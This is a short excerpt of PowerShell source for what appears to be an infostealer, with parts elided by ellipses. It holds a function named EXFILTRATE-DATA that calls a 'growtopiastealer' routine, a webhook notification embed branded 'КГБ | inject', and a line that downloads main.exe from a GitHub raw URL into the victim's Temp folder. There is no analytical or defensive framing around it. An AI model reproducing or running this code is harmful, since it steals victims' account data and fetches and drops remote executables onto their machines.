...
function EXFILTRATE-DATA {
   ...
   growtopiastealer	
    ...
    $embed_and_body = @{
        ...
        "content" = "@everyone"
        "title" = "КГБ"
        "description" = "КГБ | is ready"
        "color" = "3447003"
        "avatar_url" = "https://raw.githubusercontent.com/CtBasheur/index/main/index/images.png"
        "url" = "https://raw.githubusercontent.com/CtBasheur/index/main/index/images.png"
        "embeds" = @(
            @{
                "title" = "КГБ | inject"
                "url" = "https://raw.githubusercontent.com/CtBasheur/index/main/index/images.png"
    ...
    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/CtBasheur/sqdfqsdfshdsdfh/main/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
